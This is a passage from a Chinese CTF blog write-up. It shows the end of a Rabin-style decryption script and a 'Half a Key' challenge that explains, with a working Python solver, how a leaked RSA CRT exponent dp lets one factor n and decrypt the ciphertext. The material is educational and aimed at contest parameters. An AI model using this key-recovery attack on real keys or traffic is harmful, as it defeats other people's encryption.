class="string">&quot;c is not a quadratic residue modulo p&quot;</span>)</span><br><span class="line">         <span class="comment"># This might happen if there&#x27;s a typo in the problem or my understanding, but proceeding.</span></span><br><span class="line">         <span class="comment"># Actually modular_sqrt returns 0 if not residue, let&#x27;s check manually.</span></span><br><span class="line">    <span class="keyword">if</span> mq == <span class="number">0</span> <span class="keyword">and</span> legendre_symbol(c, q) != <span class="number">1</span>:</span><br><span class="line">         <span class="built_in">print</span>(<span class="string">&quot;c is not a quadratic residue modulo q&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Extended Euclidean Algorithm to find yp and yq such that</span></span><br><span class="line">    <span class="comment"># yp * p + yq * q = 1</span></span><br><span class="line">    g, yp, yq = extended_gcd(p, q)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Chinese Remainder Theorem</span></span><br><span class="line">    <span class="comment"># We want x such that:</span></span><br><span class="line">    <span class="comment"># x = mp (mod p)</span></span><br><span class="line">    <span class="comment"># x = mq (mod q)</span></span><br><span class="line">    <span class="comment"># Formula: x = (mp * yq * q + mq * yp * p) mod n</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># There are 4 combinations:</span></span><br><span class="line">    <span class="comment"># 1. mp, mq</span></span><br><span class="line">    <span class="comment"># 2. mp, -mq</span></span><br><span class="line">    <span class="comment"># 3. -mp, mq</span></span><br><span class="line">    <span class="comment"># 4. -mp, -mq</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Note: yp*p + yq*q = 1</span></span><br><span class="line">    <span class="comment"># So yq*q = 1 (mod p), yq*q = 0 (mod q)</span></span><br><span class="line">    <span class="comment">#    yp*p = 0 (mod p), yp*p = 1 (mod q)</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># We can use the calculated coefficients directly.</span></span><br><span class="line">    <span class="comment"># root1 = (mp * yq * q + mq * yp * p) % n</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># Let&#x27;s simplify:</span></span><br><span class="line">    <span class="comment"># r1 = (mp * yq * q + mq * yp * p) % n</span></span><br><span class="line">    <span class="comment"># r2 = (mp * yq * q - mq * yp * p) % n</span></span><br><span class="line">    <span class="comment"># r3 = (-mp * yq * q + mq * yp * p) % n</span></span><br><span class="line">    <span class="comment"># r4 = (-mp * yq * q - mq * yp * p) % n</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># But wait, simpler CRT implementation:</span></span><br><span class="line">    <span class="comment"># x = (a * M_1 * y_1 + ... )</span></span><br><span class="line">    <span class="comment"># Here M_1 = q, y_1 = inv(q, p) -&gt; this is yq mod p? No.</span></span><br><span class="line">    <span class="comment"># yp * p + yq * q = 1 =&gt; yq * q = 1 mod p. So yq is inv(q, p). </span></span><br><span class="line">    <span class="comment"># Actually, the extended_gcd returns yp, yq such that yp*p + yq*q = 1.</span></span><br><span class="line">    <span class="comment"># So yq*q = 1 mod p, and yp*p = 1 mod q.</span></span><br><span class="line">    </span><br><span class="line">    term_p = yq * q * mp</span><br><span class="line">    term_q = yp * p * mq</span><br><span class="line">    </span><br><span class="line">    r1 = (term_p + term_q) % n</span><br><span class="line">    r2 = (term_p - term_q) % n</span><br><span class="line">    r3 = (-term_p + term_q) % n</span><br><span class="line">    r4 = (-term_p - term_q) % n</span><br><span class="line">    </span><br><span class="line">    roots = [r1, r2, r3, r4]</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;\nPossible Plaintexts:&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> i, r <span class="keyword">in</span> <span class="built_in">enumerate</span>(roots):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;\n--- Root <span class="subst">&#123;i+<span class="number">1</span>&#125;</span> ---&quot;</span>)</span><br><span class="line">        <span class="comment"># print(f&quot;Decimal: &#123;r&#125;&quot;)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment"># Convert to bytes</span></span><br><span class="line">            <span class="comment"># Determine length in bytes</span></span><br><span class="line">            bit_len = r.bit_length()</span><br><span class="line">            byte_len = (bit_len + <span class="number">7</span>) // <span class="number">8</span></span><br><span class="line">            decoded = r.to_bytes(byte_len, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decoded (bytes): <span class="subst">&#123;decoded&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Decoded (utf-8): <span class="subst">&#123;decoded.decode(<span class="string">&#x27;utf-8&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error decoding: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Half-a-Key"><a class="header-anchor" href="#Half-a-Key">¶</a>Half a Key</h2>
<ol>
<li>题目背景</li>
</ol>
<p>在 RSA 公钥密码体制中，为了提高解密速度，常常使用中国剩余定理（CRT）进行优化。<br>
标准 RSA 解密需要计算 $m = c^d \pmod n$，其中 $d$ 是私钥指数，往往很大，计算耗时。<br>
使用 CRT 优化后，系统会预先计算以下参数：</p>
<ul>
<li>$dp = d \pmod{p-1}$</li>
<li>$dq = d \pmod{q-1}$</li>
<li>$q_{inv} = q^{-1} \pmod p$</li>
</ul>
<p>本题的情景是：系统泄露了公开参数 $(n, e)$ 和 CRT 优化参数中的 $dp$，以及密文 $c$。我们需要利用这些信息恢复明文。</p>
<ol start="2">
<li>原理分析</li>
</ol>
<p>我们已知 RSA 的基本关系：<br>
$$e \cdot d \equiv 1 \pmod{\phi(n)}$$<br>
其中 $\phi(n) = (p-1)(q-1)$。这意味着存在整数 $k’$ 使得：<br>
$$e \cdot d = 1 + k’ \cdot (p-1)(q-1)$$<br>
因此：<br>
$$e \cdot d \equiv 1 \pmod{p-1}$$</p>
<p>根据 $dp$ 的定义：<br>
$$dp \equiv d \pmod{p-1}$$<br>
我们可以将 $d$ 写为 $d = dp + m \cdot (p-1)$，代入上式：<br>
$$e \cdot (dp + m \cdot (p-1)) \equiv 1 \pmod{p-1}$$<br>
$$e \cdot dp + e \cdot m \cdot (p-1) \equiv 1 \pmod{p-1}$$<br>
$$e \cdot dp \equiv 1 \pmod{p-1}$$</p>
<p>这意味着 $e \cdot dp - 1$ 是 $p-1$ 的倍数。即存在整数 $k$ 使得：<br>
$$e \cdot dp - 1 = k \cdot (p-1)$$</p>
<p>由此可得 $p$ 的表达式：<br>
$$p - 1 = \frac{e \cdot dp - 1}{k} \implies p = \frac{e \cdot dp - 1}{k} + 1$$</p>
<ol start="3">
<li>攻击思路</li>
</ol>
<p>由于 $dp &lt; p-1$ 且 $e$ 通常较小（本题中 $e=65537$），$k$ 的范围在 $1$ 到 $e$ 之间。<br>
我们可以通过遍历 $k \in [1, e)$ 来寻找 $p$：</p>
<ol>
<li>计算 $X = e \cdot dp - 1$。</li>
<li>遍历 $k$ 从 1 到 $e-1$。</li>
<li>如果 $X$ 能被 $k$ 整除，计算候选值 $p_{cand} = X // k + 1$。</li>
<li>验证 $p_{cand}$ 是否能整除 $n$（即 $n \pmod{p_{cand}} == 0$）。</li>
<li>如果验证通过，则找到了素数 $p$。</li>
</ol>
<p>一旦找到 $p$，即可算出 $q = n / p$，进而算出 $\phi(n)$ 和私钥 $d$，最后解密密文。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="comment"># Given parameters</span></span><br><span class="line">n = <span class="number">15436586506265382785524723267926444275462583019354383194654618933970433830434544481689625981207606375978708092558218246652496848076710411132268953499043735379180887935756772262155008862710764094267410967565241203605386593697737434875910984139143271151900377372693190411504735649123965519189648830868758032067</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">dp = <span class="number">379731142995118368195086502083726192650138136864805821111741080341262318450359112900427553070639257250091100401461103206486523535760843615494638091936809</span></span><br><span class="line">c = <span class="number">854977693463411460490582164652536883002498905251706308634386005958509682016980677282553767296915296737583796051269333809745316569004849097563723358017329758234680761174609149316747091398434695986939450351231497326579265836956690907677434464255178122585307742001203732956675315052213672484434073446872723134</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extended_gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> b, <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, y, x = extended_gcd(b % a, a)</span><br><span class="line">        <span class="keyword">return</span> g, x - (b // a) * y, y</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    g, x, y = extended_gcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x % m</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">long_to_bytes</span>(<span class="params">val, endianness=<span class="string">&#x27;big&#x27;</span></span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Use :ref:`string_to_bytes` to convert an integer into a string of bytes</span></span><br><span class="line"><span class="string">    to ensure the string represents the value of the integer with the given</span></span><br><span class="line"><span class="string">    endianness.</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> val.to_bytes((val.bit_length() + <span class="number">7</span>) // <span class="number">8</span>, byteorder=endianness)</span><br><span class="line">    <span class="keyword">except</span> AttributeError:</span><br><span class="line">        <span class="comment"># For Python 2 compatibility (if needed, though we are in py3 env usually)</span></span><br><span class="line">        <span class="keyword">import</span> binascii</span><br><span class="line">        h = <span class="built_in">hex</span>(val)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(h) % <span class="number">2</span> == <span class="number">1</span>:</span><br><span class="line">            h = <span class="string">&#x27;0&#x27;</span> + h</span><br><span class="line">        <span class="keyword">return</span> binascii.unhexlify(h[<span class="number">2</span>:])</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting search for p...&quot;</span>)</span><br><span class="line">    <span class="comment"># e * dp = 1 + k * (p - 1)</span></span><br><span class="line">    <span class="comment"># =&gt; p - 1 = (e * dp - 1) / k</span></span><br><span class="line">    </span><br><span class="line">    numerator = e * dp - <span class="number">1</span></span><br><span class="line">    </span><br><span class="line">    found_p = <span class="literal">None</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment"># k ranges from 1 to e</span></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e):</span><br><span class="line">        <span class="keyword">if</span> numerator % k == <span class="number">0</span>:</span><br><span class="line">            p_minus_1 = numerator // k</span><br><span class="line">            p_candidate = p_minus_1 + <span class="number">1</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> n % p_candidate == <span class="number">0</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;Found p using k=<span class="subst">&#123;k&#125;</span>&quot;</span>)</span><br><span class="line">                found_p = p_candidate</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> found_p:</span><br><span class="line">        p = found_p</span><br><span class="line">        q = n // p</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;p = <span class="subst">&#123;p&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;q = <span class="subst">&#123;q&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Calculate d</span></span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        d = modinv(e, phi)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># Decrypt</span></span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Decrypted m (int): <span class="subst">&#123;m&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            m_bytes = long_to_bytes(m)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decrypted message (bytes): <span class="subst">&#123;m_bytes&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Decrypted message (utf-8): <span class="subst">&#123;m_bytes.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;Error converting to bytes: <span class="subst">&#123;err&#125;</span>&quot;</span>)</span><br><span class="line">            </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Failed to find p.&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    solve()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://luoyinhui.github.io">luoyinhui</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://luoyinhui.github.io/posts/659617ad/">https://luoyinhui.github.io/posts/659617ad/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://luoyinhui.github.io" target="_blank">落殷回的博客</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a><a class="post-meta__tags" href="/tags/2026/">2026</a><a class="post-meta__tags" href="/tags/%E9%9D%92%E5%B0%91%E5%B9%B4CTF/">青少年CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91%E9%9D%92%E5%B0%91%E5%B9%B4CTF-S1%C2%B72026%E5%85%AC%E7%9B%8A%E8%B5%9B_image-21.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/pluginsSrc/butterfly-extsrc/sharejs/dist/css/share.min.css?v=1.1.6" media="print" onload="this.media='all'"><script src="/pluginsSrc/butterfly-extsrc/sharejs/dist/js/social-share.min.js?v=1.1.6" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/weixin.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/weixin.png" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/zhifubao.png" target="_blank"><img class="post-qr-code-img" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/zhifubao.png" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/posts/e4c91b0e/" title="【软件】cheat-engine"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="onerror=null;src='/img/404.webp'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">【软件】cheat-engine</div></div><div class="info-2"><div class="info-item-1">cheat-engine学习笔记，持续更新ing</div></div></div></a><a class="pagination-related" href="/posts/2f862a25/" title="【笔记】零（被）碎（拷）问（打）题记录"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" onerror="onerror=null;src='/img/404.webp'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">【笔记】零（被）碎（拷）问（打）题记录</div></div><div class="info-2"><div class="info-item-1">¶网络 ¶掩码考点  同一局域网下的192.168.50.128/25和192.168.50.127/25能否ping通（无路由器无交换机的情况） 那同一局域网下的192.168.50.127/25和192.168.50.126/25能否ping通  子网掩码（Subnet Mask）是计算机网络中非常核心的概念。简单来说，它的作用就是在 IP 地址中“划线”，区分哪一部分代表“街道”（网络号），哪一部分代表“门牌号”（主机号）。 以下是关于子网掩码的核心知识点：  核心作用：身份识别 一个 IP 地址（如 192.168.1.5）本身无法告诉电脑它属于哪个网络。子网掩码的作用就是：   确定网络地址： 告诉设备哪些位是网络标识。 确定主机地址： 告诉设备哪些位是个体设备标识。 判断是否在同一网段： 电脑通过子网掩码计算出目标 IP 是否和自己在同一个“群聊”里。如果是，直接发消息；如果不是，就发给路由器（网关）。  ¶2. 形态与结构 子网掩码和 IP 地址一样，也是 32 位二进制数，通常用“点分十进制”表示。它的规则非常简单粗暴：  连续的 1： 对应的 IP 位是网络号。...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/posts/90f90e31/" title="【比赛】2026-furryCTF"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%912026-furryCTF_image.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-13</div><div class="info-item-2">【比赛】2026-furryCTF</div></div><div class="info-2"><div class="info-item-1">持续更新中...</div></div></div></a><a class="pagination-related" href="/posts/6e242bce/" title="【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/%E3%80%90%E6%AF%94%E8%B5%9B%E3%80%91CTFSHOW-2026%E5%85%83%E6%97%A6%E8%B7%A8%E5%B9%B4%E6%AC%A2%E4%B9%90%E8%B5%9B-CS2026_image-8.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2026-01-03</div><div class="info-item-2">【比赛】CTFSHOW-2026元旦跨年欢乐赛-CS2026</div></div><div class="info-2"><div class="info-item-1">赛后根据官方wp和大佬zs1994的wp学习整理了一下，感谢ctfshow组织比赛</div></div></div></a><a class="pagination-related" href="/posts/9004eb76/" title="【刷题】SPC新生讲座题目wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-06</div><div class="info-item-2">【刷题】SPC新生讲座题目wp</div></div><div class="info-2"><div class="info-item-1">¶鸣谢  感谢sq,xc学长和cty学姐的帮助和教导！！！ 除了大头像放后面做其他也是完结了，第一次wp磕磕绊绊做出来了嘻嘻  ¶曼波曼波曼波  倒转的base，翻转脚本：  # 读取 txt 文件并翻转内容def reverse_txt_file(input_path, output_path):    try:        with open(input_path, &#x27;r&#x27;, encoding=&#x27;utf-8&#x27;) as file:            content = file.read()                reversed_content = content[::-1]                with open(output_path, &#x27;w&#x27;, encoding=&#x27;utf-8&#x27;) as file:            file.write(reversed_content)                print(f&quot;成功！原文件: &#123;inpu...</div></div></div></a><a class="pagination-related" href="/posts/d6c104b4/" title="【刷题】ctfshow-pwn合集wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-15</div><div class="info-item-2">【刷题】ctfshow-pwn合集wp</div></div><div class="info-2"><div class="info-item-1">¶致谢  感谢sq学长、My6n、Ambb1、Claire_cat的笔记 感谢sq学长的帮助  ¶pwn入门 ¶Test_your_nc ¶pwn0【待】   通过打开容器后获得命令，在finalshell通过手动输入信息成功ssh连上 注意：虚拟机开启NAT模式才能连上，更改模式后重启才生效  pwd指令查看当前目录 ls发现当前目录下没东西 cd /回到上一级目录 ls发现当前目录下有文件ctfshow_flag cat ctfshow_flag得到 flag  ¶pwn1  chmod 777 pwn给附件加权限 checksec pwn查看附件信息，64 位  wp要ida看但其实试运行一遍还有题目都提示nc链接，容器给的命令直接复制黏贴就好了   ¶pwn2  加权限-查信息-运行-nc连接-shell输入代码 system(bin/sh)就是给shell？？  ¶pwn4   反编译程序理解-shell获得  ¶前置基础 ¶pwn5  题目：  运行此文件，将得到的字符串以ctfshow{xxxxx}提交。 如：运行文件后 输出的内容为 Hello_World 提交的...</div></div></div></a><a class="pagination-related" href="/posts/3a95b3f6/" title="【刷题】ctfshow-web合集wp"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-20</div><div class="info-item-2">【刷题】ctfshow-web合集wp</div></div><div class="info-2"><div class="info-item-1">¶web入门 ¶信息搜集 ¶web1  使用浏览器自带的审计功能F12可以查看网站源代码. 前端的HTML（超文本标记语言）中，如果想要添加注释，需要使用 注释标签。该标签用来在源文档中插入注释，注释不会在浏览器中显示。 在URL前可以通过添加 view-source:URL 实现绕过前端限制显示网页源码.  ¶web2  JavaScript实现禁用代码审计   js前台拦截完全就是无效操作 因为js前台拦截可以有三种方法获取  禁用js：  直接ctrl+u 抓包 直接在url前边加view-source:   ¶web3  自带工具直接抓包   ¶web4  提示了robot题型    ¶web5  phps源码泄露 PHPS 文件是 PHP 源代码文件，通常用于通过 Web 浏览器直接查看 PHP 代码内容。然而，这种文件可能导致源码泄露，带来安全隐患。 法一：使用工具：dirsearch  http状态码       法二： php语言编写网站的主页文件是index.php   ¶web6  题目  解压源码到当前目录，测试正常，收工 考察代码泄露。直接访问url/ww...</div></div></div></a><a class="pagination-related" href="/posts/3ea4ec10/" title="【比赛】2024-ISCTF"><img class="cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/shouye.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-27</div><div class="info-item-2">【比赛】2024-ISCTF</div></div><div class="info-2"><div class="info-item-1">¶File_Format     改回exe输密码解压  ¶starry sky【待】  随波逐流爆图片 尾部XORKEY:FF    010居然还有这功能！！？    记得选无符号字节十六进制   ¶web ¶1z_php  ca\t /f*或者ls /得到f14g文件名  ¶25时晓山瑞希生日会 User-Agent: Project Sekai			//伪造UA头X-Forwarded-For:127.0.0.1			//伪造本地用户  前面都是考过的点 搜索得知 25时生日会 是在八月二十七举办，伪造日期即可得到 flag  Date: Tue, 27 Aug 2024 12:41:59 GMT ¶reverse ¶Ezre   看字符串追踪    </div></div></div></a></div></div><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="twikoo-wrap"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/touxiang.png" onerror="this.onerror=null;this.src='/img/404.webp'" alt="avatar"/></div><div class="author-info-name">luoyinhui</div><div class="author-info-description">记录踩坑与瞎折腾，由Hexo+Github搭建</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">73</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">42</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/luoyinhui"><i class="fab fa-github"></i><span>Follow Me</span></a><a class="card-info-btn" href="/subscribe"><i class="fas fa-rss"></i><span>订阅RSS</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客！</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E8%83%B6%E5%9B%8A%E7%95%99%E8%A8%80%E6%9D%BF"><span class="toc-text">时间胶囊留言板</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CallBack"><span class="toc-text">CallBack</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#preg-replace"><span class="toc-text">preg_replace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AD%94%E6%A1%88%E4%B9%8B%E4%B9%A6"><span class="toc-text">答案之书</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%AA%81%E7%A0%B4%E8%BF%87%E7%A8%8B"><span class="toc-text">漏洞与突破过程</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#easy-php"><span class="toc-text">easy_php</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#serialization"><span class="toc-text">serialization</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%AD%96%E7%95%A5"><span class="toc-text">利用策略</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Payload-%E7%94%9F%E6%88%90"><span class="toc-text">Payload 生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%AD%A5%E9%AA%A4"><span class="toc-text">执行步骤</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link"><span class="toc-text">¶</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">编程</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%B8%8B%E7%81%AB%E8%BD%A6"><span class="toc-text">上下火车</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-text">1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2"><span class="toc-text">2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3"><span class="toc-text">3</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E5%9B%9E%E6%96%87%E6%95%B0"><span class="toc-text">4回文数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%80%E9%95%BF"><span class="toc-text">最长</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%8A%E4%B8%8B%E7%81%AB%E8%BD%A6-v2"><span class="toc-text">上下火车</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">crypto</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A5%BD%E5%A4%9A%E2%80%9C%E5%90%8E%E2%80%9D%E9%97%A8%EF%BC%81%E3%80%90%E8%87%AA%E5%B7%B1%E6%B2%A1%E8%A7%A3%E5%87%BA%E6%9D%A5%E7%9A%84%E3%80%91"><span class="toc-text">好多“后”门！【自己没解出来的】</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">misc</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" 